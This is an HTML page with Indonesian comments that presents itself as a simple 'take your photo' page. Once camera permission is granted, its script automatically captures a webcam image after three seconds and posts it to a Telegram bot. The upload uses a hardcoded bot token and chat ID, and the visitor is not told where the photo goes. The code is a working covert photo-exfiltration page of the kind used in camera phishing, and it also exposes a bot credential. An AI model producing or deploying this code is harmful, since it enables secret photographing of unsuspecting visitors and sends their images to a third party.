<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ambil Foto Otomatis</title>
  <style>
    video {
      width: 100%;
      border: 1px solid black;
    }
    #canvas {
      display: none;
    }
  </style>
</head>
<body>

<h2>Ambil Foto Anda</h2>
<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');

  // Minta izin untuk mengakses kamera dan mulai otomatis jika diizinkan
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      // Kamera aktif setelah izin diberikan
      video.srcObject = stream;

      // Setelah kamera aktif, otomatis jepret foto setelah 3 detik
      setTimeout(() => {
        capturePhoto();
      }, 3000); // Menunggu 3 detik untuk mengambil foto
    })
    .catch(error => {
      console.log('Tidak dapat mengakses kamera:', error);
    });

  // Fungsi untuk mengambil foto
  function capturePhoto() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Mengonversi gambar dari canvas menjadi Blob
    canvas.toBlob(function(blob) {
      // Kirim gambar dalam format file ke bot Telegram
      sendImageToTelegram(blob);
    }, 'image/jpeg');
  }

  // Fungsi untuk mengirim gambar ke bot Telegram
  function sendImageToTelegram(imageBlob) {
    const token = '7836794924:AAFAGXGZu3rfF1dJDuoKiQyNUIZex0Xz4bs';
    const chatId = '7324869375';
    const url = `https://api.telegram.org/bot${token}/sendPhoto`;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', imageBlob, 'photo.jpg');

    fetch(url, {
      method: 'POST',
      body: formData,
    })
    .then(response => response.json())
    .then(data => {
      console.log('Gambar berhasil dikirim:', data);
    })
    .catch(error => {
      console.log('Terjadi kesalahan saat mengirim gambar:', error);
    });
  }
</script>

</body>
</html>
